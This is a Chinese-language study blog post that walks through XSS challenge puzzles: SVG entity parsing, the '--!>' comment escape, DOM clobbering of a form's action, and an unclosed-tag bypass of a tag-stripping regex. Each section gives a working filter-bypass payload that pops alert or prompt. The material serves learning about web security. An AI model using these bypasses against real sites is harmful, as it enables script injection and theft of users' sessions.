---
title: 'XSS进阶学习分享（一）'
date: 2023-02-07 10:14:01
tags: [XSS,笔记,知识点巩固,学习笔记]
published: true
hideInList: false
feature: 
isTop: false
---

~~偷悄悄：其实是技术分享用的PPT大纲~~

后续会在blog继续更一些之前看到的h1的xss构造攻击链为rce的文章（或许）
更新了文章：https://1dayluo.github.io/post/xss-shui-ti-pian-guan-yu-dom-colbbering-yi-xie-ge-ren-li-jie/ 下对于DOM clobbering的理解。


## 从SVG特性到高级XSS利用

## svg基础

- svg是最短的攻击向量 ： `<svg/onload=alert(1)>`
  
- svg特性可利用在绕过上：
  
  - XML-ish
    
  - 利用onload 和a绕过
    

### XML-ish

它支持在两个svg标签里插入任何CDATA元素，其中包括 `<script>` 并被按照常规加载。

题目：

```javascript
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}     
```

过滤的场景：

- 传统的一些攻击向量
  
- “=” 被禁止：html标签下的属性
  
- “=”被禁止：事件处理，包括on开头的系列：例如onload
  
- 左括号被禁止
  

没有考虑到的场景：

- svg的XML-ish特性

绕过利用了svg支持标签内插入任何CDATA元素。

在此之前先了解一下HTML解析机制：

> 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’<’符号（后面没有跟’/‘符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”……最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。（原文内容）

所以任何标签建立并解析的前提是被HTML解析器判定为”标签开始状态“。这也就是为什么不用svg，只是用16进制实体不能够触发alert，例如：

```javascript
<div>&#60;img src&#x3d;x onerror&#x3d;alert&#x28;1)&#62;</div>
```

在这种情况下，「字符引用」不会判定为标签开始状态，也就不会建立新标签并解析标签。

像将实体编码放入 `script` 标签里也不可以：

```
<script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script>
```

因为script标签属于HTML里五类元素里的 原始文本元素，不支持解析字符引用。

（五类：原始文本元素，RCDATA，空元素，外部元素，基本元素）

那么，svg的XML-ish意味着什么呢？ 首先明确svg是属于外部元素的。

XML-ish代表：`<svg>`遵循XML的定义。  
在XML中实体会自动转义,除了`<![CDATA[`和`]]>`包含的实体，所以最后的payload为：

```
<svg><script>prompt&#x28;1)</script></svg>
```

## 注释逃逸：HTML5

题目

```
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```

这里用HTML5对于注释的标准来绕过

> But, as it was first noted in 2012, HTML5 comments are a little bit special. Not only --> but also the character sequence --!>  has the ability to close comments and thereby it possible to bypass this filter as well.

payload:

```javascript
--!> <svg/onload=prompt(1)>
```

## DOM Clobbering：从html injection到 javascript injection

题目

```javascript
  function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}
```

读取代码，可以发现，会用`#` 对input进行分割，前半部分为form的action的值，后半部分插入到`<input>` 标签内。并且这一切生成 outerHTML里。

可以看到，即使action注入了script也由于下面的if判断无法触发，那么该怎么办呢？

这里用了标准下HTMLCollection的特性：

> The namedItem(key) method steps are:
> If key is the empty string, return null.
> Return the first element in the collection for which at least one of the following is true:
> it has an ID which is key;
> it is in the HTML namespace and has a name attribute whose value is key;
> or null if there is no such element.

重点在”Return the first element in the collection for which at least one of the following is true:“ 这句，下面有三个条件，满足一个即可。这里这道题我们用的是第三个条件，利用inputi标签name这个attribute。HTML解析会返回先搜索到的第一个属性名称为要查询的关键字（ `document.forms[0].action` )

```
javascript:prompt(1)#{"action":1}
```

HTML看起来是这样的

![](https://i.imgur.com/ZeIxUr0.png)

这里我们取 `document.forms[0].action` 取到的是

![](https://i.imgur.com/SvBaZBR.png)

## 利用自动补全绕过js语法

题目

```javascript
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

这里它用正则表达式的 `gi` 限定了大小写不敏感匹配，但是，它没有考虑到不完整的标签

我们用不完整的注入

```javascript
<svg/onload=prompt(1)
```

这里HTML会自动补全后面的 `>`